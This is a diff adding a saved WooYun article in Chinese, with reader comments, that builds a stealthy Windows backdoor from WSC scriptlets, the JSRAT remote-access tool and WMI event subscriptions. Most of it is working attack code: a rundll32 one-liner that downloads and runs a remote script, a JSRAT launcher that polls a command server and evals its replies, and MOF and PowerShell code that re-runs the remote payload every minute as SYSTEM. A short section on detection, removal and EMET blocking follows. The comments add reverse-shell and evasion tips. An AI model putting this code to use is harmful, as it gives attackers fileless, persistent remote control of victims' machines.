@@ -1,0 +1,121 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WSC、JSRAT and WMI Backdoor</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/05/06 14:16" ui-time="" datetime="2016/05/06 14:16" class="published ng-binding ng-isolate-scope">2016/05/06 14:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>最近学习了lcx提供的资料《利用wsc来做一个asp后门》，在了解了wsc文件的一些特性后，产生了一个有趣的想法：</p><p>如果将其与JSRAT和WMI Backdoor相结合，那将会有多大的威力呢？</p><p><img alt="Alt text" img-src="61da733f1a974b149af9638b2b313396ead423f9.jpg"></p><p>相关资料：</p><blockquote><p>《利用wsc来做一个asp后门》:<a href="http://huaidan.org/archives/2574.html">http://huaidan.org/archives/2574.html</a><br>《WMI Backdoor》: <a href="http://drops.wooyun.org/tips/8260">http://drops.wooyun.org/tips/8260</a><br>《JavaScript Backdoor》: <a href="http://drops.wooyun.org/tips/11764">http://drops.wooyun.org/tips/11764</a></p></blockquote><h1>0x01 WSC</h1><hr><p><strong>WSC</strong>，全称Windows Script<br>可用来开发COM组件<br>可被其他语言调用</p><p>更多介绍见：<br><a href="http://www.xav.com/perl/Windows/windows_script_components.html">http://www.xav.com/perl/Windows/windows&#95;script&#95;components.html</a></p><h2>1、简单示例</h2><p>一个简单的wsc脚本如下，保存为test.wsc：</p><pre><code>#!xml
+&lt;?xml version="1.0"?&gt;
+&lt;package&gt;
+&lt;component id="testWSC"&gt;    
+
+&lt;public&gt;
+ &lt;method name="Sum"&gt;
+        &lt;PARAMETER name="X"/&gt;
+        &lt;PARAMETER name="Y"/&gt;
+    &lt;/method&gt;
+&lt;/public&gt;    
+
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+function Sum(X, Y) {
+    var result = X + Y;
+    return result;
+    }
+]]&gt;
+&lt;/script&gt;    
+
+&lt;/component&gt;
+&lt;/package&gt;
+</code></pre><p>通过如下js代码即可调用脚本中的Sum函数：</p><pre><code>#!javascript
+var ref = GetObject("script:C:\\testwsc\\test.wsc");
+var x = ref.Sum(4,6);
+WScript.Echo(x);
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="8485f10780cbb9d0a89bfdbd774ecf4062fe1263.jpg"></p><p><strong>注：</strong><br>wsc文件的后缀名可以任意</p><h2>2、本地启动计算器</h2><p>以上内容和sct文件似曾相识，所以我们可以把里面的功能修改为启动一个计算器</p><p>wsc文件如下：</p><pre><code>#!xml
+&lt;?xml version="1.0"?&gt;    
+
+&lt;package&gt;
+&lt;component id="testCalc"&gt;    
+
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+]]&gt;
+&lt;/script&gt;    
+
+&lt;/component&gt;
+&lt;/package&gt;
+</code></pre><p>对应的js文件可简化为：</p><pre><code>#!javascript
+GetObject("script:C:\\testwsc\\test.wsc");
+</code></pre><p>执行后如图：</p><p><img alt="Alt text" img-src="952a1949902271922eade850cb6e387cc115f4c5.jpg"></p><h2>3、远程启动计算器</h2><p><strong>——</strong> 如果把wsc文件放到服务器上面呢？ <strong>——</strong> 当然可以正常执行。</p><p>地址如下： <a href="https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test">https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test</a></p><p>js文件修改为：</p><pre><code>#!javascript
+GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+</code></pre><p>执行如图：</p><p><img alt="Alt text" img-src="3c48f126537231b535398014b36d39b7c007905d.jpg"></p><h1>0x02 JSRAT</h1><hr><p>如果用在rundll32执行js的方法上会怎样呢？</p><h2>1、calc</h2><p>cmd下执行：</p><pre><code>#!shell
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="a670815738ca436515af7291fac0460cd44bcfe0.jpg"></p><h2>2、jsrat</h2><p>如果把服务器上文件的内容替换成jsrat的启动代码会怎样呢？<br>代码如下:</p><pre><code>#!xml
+&lt;?xml version="1.0"?&gt;    
+
+&lt;package&gt;
+&lt;component id="testCalc"&gt;    
+
+&lt;script language="JScript"&gt;
+&lt;![CDATA[
+        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication     
+
+
+\";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
+        new ActiveXObject("WScript.Shell").Run(rat,0,true);
+]]&gt;
+&lt;/script&gt;    
+
+&lt;/component&gt;
+&lt;/package&gt;
+</code></pre><p>为区别演示，已上传至另一文件testJSRAT：<br><a href="https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT">https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT</a></p><p>cmd下执行：</p><pre><code>#!shell
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT")
+</code></pre><p>执行后弹回JSRAT的shell</p><h2>3、分析</h2><p>这种方式有如下优点：<br><strong>a.</strong>再次简化了JSRAT的启动代码，只需要执行GetObject()<br><strong>b.</strong>由于是远程执行wsc文件，所以payload随时可以更改，代码可以随时升级</p><h1>0x03 WMI Backdoor</h1><hr><p>通过WMI不仅可以定时执行程序，还能定时执行脚本<br>定时执行程序的方法之前介绍过，此处跳过，下面介绍一下定时执行脚本的方法</p><p>WMI支持vbs和js脚本，这里只介绍启动js脚本的方法</p><h2>1、mof</h2><p>注意转义字符<br>"用\"表示<br>内容如下：</p><pre><code>pragma namespace("\\\\.\\root\\subscription")    
+
+instance of __EventFilter as $EventFilter
+{
+    EventNamespace = "Root\\Cimv2";
+    Name  = "filtP1";
+    Query = "Select * From __InstanceModificationEvent "
+            "Where TargetInstance Isa \"Win32_LocalTime\" "
+            "And TargetInstance.Second = 1";
+    QueryLanguage = "WQL";
+};    
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+    Name = "consP1";
+    ScriptingEngine = "JScript";
+    ScriptText = "GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")";
+};    
+
+instance of __FilterToConsumerBinding
+{
+    Consumer   = $Consumer;
+    Filter = $EventFilter;
+};
+</code></pre><p>演示略</p><h2>2、powershell</h2><p>注意转义字符<br>"用""表示<br>内容如下：</p><pre><code>#!powershell
+$filterName = 'filtP1'
+$consumerName = 'consP1'
+$Command ="GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")"    
+
+
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"    
+
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop    
+
+$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ScriptingEngine='JScript';ScriptText=$Command}    
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
+</code></pre><p>演示略</p><h2>3、检测</h2><pre><code>#!powershell
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter    
+
+
+Get-WMIObject -Namespace root\Subscription -Class __EventConsumer    
+
+
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
+</code></pre><h2>4、清除</h2><pre><code>#!powershell
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='filtP1'" | Remove-WmiObject -Verbose    
+
+Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='consP1'" | Remove-WmiObject -Verbose    
+
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose
+</code></pre><h2>5、分析</h2><p><strong>a.</strong> 注册后每隔1分钟执行一次远程服务器上的js脚本<br><strong>b.</strong> 权限为system<br><strong>c.</strong> payload可以随时更换<br><strong>d.</strong> 不写文件<br><strong>e.</strong> 不写注册表<br><strong>f.</strong> 自启动</p><h1>0x04 防御</h1><hr><h2>1、第一道防线</h2><p>确保系统不被入侵。这个后门方法植入的前提是需要在系统上能够执行代码，所以建议勤打补丁、安装杀毒软件、防火墙</p><h2>2、第二道防线</h2><p>建立白名单机制。启动Windows AppLocker，限制白名单以外的程序和脚本运行</p><h2>3、第三道防线</h2><p>使用EMET（增强减灾体验工具）。配置规则可拦截并记录regsvr32和rundll32的使用 参考链接：<br><a href="https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET#blocking-the-regsvr32-application-whitelisting-bypass-technique">https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET#blocking-the-regsvr32-application-whitelisting-bypass-technique</a></p><h2>4、配置EMET拦截regsvr32示例：</h2><p><strong>1、下载安装EMET 5.5</strong></p><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=50766">https://www.microsoft.com/en-us/download/details.aspx?id=50766</a></p><p><strong>2、配置EMET组策略模板</strong></p><p><strong>(a)</strong>在<code>%ProgramFiles%\EMET 5.5\Deployment\Group Policy Files\</code> 或<code>%ProgramFiles(x86)%\EMET 5.5\Deployment\Group Policy Files\</code>（64位系统）下找到：<br>EMET.admx<br>EMET.adml</p><p>如图</p><p><img alt="Alt text" img-src="1ac0b2ab96bc267cf719d26099ed9e87787b716b.jpg"></p><p><strong>(b)</strong>将EMET.admx复制到<code>%SystemRoot%\PolicyDefinitions\</code>下</p><p><strong>(c)</strong>将EMET.adml复制到<code>%SystemRoot%\PolicyDefinitions\zh-CN</code>下（英文版系统复制到<code>%SystemRoot%\PolicyDefinitions\en-us\</code> ）</p><p><strong>3、配置EMET规则</strong></p><p><strong>(a)</strong>输入gpedit.msc进入组策略 中文系统为：<br>计算机配置-管理模板-Windows组件-EMET</p><p>英文系统为：<br><code>Computer Policy &gt; Administrative Templates &gt; Windows Components &gt; EMET</code></p><p><strong>(b)</strong>双击Application Configuration<br>选择启用<br>点击显示</p><p>如图</p><p><img alt="Alt text" img-src="d04c1387ef26f4e6fc68043e75edf6c112a95194.jpg"></p><p><strong>(c)</strong>设置</p><p>值名称： <code>*\regsvr32.exe</code><br>值： <code>+ASR asr_modules:scrobj.dll;scrrun.dll</code></p><p>如图</p><p><img alt="Alt text" img-src="939228170ceb955d28e98b96c1b81d0737b81f0a.jpg"></p><p><strong>(d)</strong>更新组策略模板</p><p>管理权权限的cmd下输入：</p><pre><code>#!shell
+gpupdate /force
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="d05f54d46b8c2843ea451460f9a1c0f9d844a8e2.jpg"></p><p><strong>(e)</strong>测试</p><p><img alt="Alt text" img-src="33caf7e646efd7fdd46eebb31b1b7880dd6ab723.jpg"></p><p>通过regsvr32调用scrobj.dll的操作被拦截</p><h1>0x05 小结</h1><hr><p>本文将WSC、JSRAT和WMI Backdoor三项技术融合，在脚本层面实现了一个近乎“完美”的后门。</p><p>当然，本文的初衷是在这项技术被滥用前尽可能的帮助大家提前做好防御的准备。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-10 08:02:03</span></div><p></p><p>@试试 1、可以改个长一点的间隔时间2、可在远程脚本里面写taskkill3、远程脚本平时的功能是正常退出，需要的时候再换上payload。所以不需要在mof中加入互斥量检测的功能</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">试试</span> <span class="reply-time">2016-05-10 04:12:35</span></div><p></p><p>@三好学生 我的意思是你的mof会一分钟运行一次 regsvr32.exe https://xxxxx<br>这样系统里就N个regsvr32了 并没有在 MOF文件中提前加入 taskkill命令 结束上一个regsvr32.exe</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-09 22:23:11</span></div><p></p><p>@试试 taskkill</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">试试</span> <span class="reply-time">2016-05-09 22:04:08</span></div><p></p><p>一分钟运行一次 怎么没解决重复运行n个regsvr32.exe的问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2016-05-09 20:39:14</span></div><p></p><p>@神在堕落 论转义的作用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大亮</span> <span class="reply-time">2016-05-09 14:35:36</span></div><p></p><p>再一次感受到了三号学生的后门技术的牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2016-05-09 11:20:04</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Fvckyou</span> <span class="reply-time">2016-05-09 09:30:36</span></div><p></p><p>牛逼。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DNS</span> <span class="reply-time">2016-05-09 08:21:02</span></div><p></p><p>真是三好学生，跟着三好学生好好学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2016-05-07 11:25:35</span></div><p></p><p>666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jye33</span> <span class="reply-time">2016-05-06 21:11:32</span></div><p></p><p>666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-06 17:51:07</span></div><p></p><p>@神在堕落 nc路径为\\，而不是\</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">神在堕落</span> <span class="reply-time">2016-05-06 17:18:48</span></div><p></p><p>... 试了一下，然后想执行nc反弹，run（&quot;nc 路径加参数&quot;）<br>点击JS后始终显示cmd黑窗口，然而并没有执行。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2016-05-06 15:29:55</span></div><p></p><p>666</p><p></p></div></div></div></div></div></main>
